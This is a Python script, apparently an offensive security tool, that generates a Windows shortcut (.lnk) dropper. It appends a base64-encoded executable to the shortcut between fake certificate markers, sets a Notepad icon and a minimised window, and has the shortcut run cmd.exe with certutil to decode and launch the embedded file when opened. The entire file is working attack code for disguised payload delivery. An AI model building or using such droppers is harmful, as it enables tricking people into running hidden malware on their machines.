#!/usr/bin/env python3

# Jean-Pierre LESUEUR (@DarkCoderSc)
# https://keybase.io/phrozen

# Requirements:
# -> pip install pypiwin32
# -> pip install winshell

import argparse
import base64
import os
import pathlib
import random
import string

import winshell


def build_shortcut(file_to_embed, shortcut_name):
    output_shortcut = "{}{}.lnk".format(
        os.path.join(pathlib.Path(__file__).parent.resolve(), ''),
        shortcut_name,
    )    

    with winshell.shortcut(output_shortcut) as shortcut:    
        # @echo off & (for %i in (.lnk) do certutil -decode %i [filename]) & start [filename].exe
        payload = "@echo off&(for %i in (*.lnk) do certutil -decode %i {0}.exe)&start {0}.exe".format(
            "".join(random.choice(string.ascii_letters) for i in range(8))
        )                

        shortcut.description = ""
        shortcut.show_cmd = "min"
        shortcut.working_directory = ""
        shortcut.path = "%COMSPEC%"

        shortcut.arguments = "/c \"{}".format(
            payload,
        )

        shortcut.icon_location = ("%windir%\\notepad.exe", 0)

    with open(file_to_embed, "rb") as file:
        encoded_content = base64.b64encode(file.read())

    with open(output_shortcut, "ab") as file:
        file.write(b"-----BEGIN CERTIFICATE-----")
        file.write(encoded_content)
        file.write(b"-----END CERTIFICATE-----")

    print("[+] Shortcut generated: \"{}\"".format(output_shortcut))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"Create Windows Shortcut with Self-Extracting Embedded File.")

    parser.add_argument('-f', '--embed-file', type=str, dest="embed_file", required=True, help="File to inject in shortcut.")

    parser.add_argument('-n', '--shorcut-name', type=str, dest="shortcut_name", required=True, help="Generated shortcut name.")

    try:
        argv = parser.parse_args()      
    except IOError as e:
        parser.error() 

    build_shortcut(argv.embed_file, argv.shortcut_name)

    print("[+] Done.")
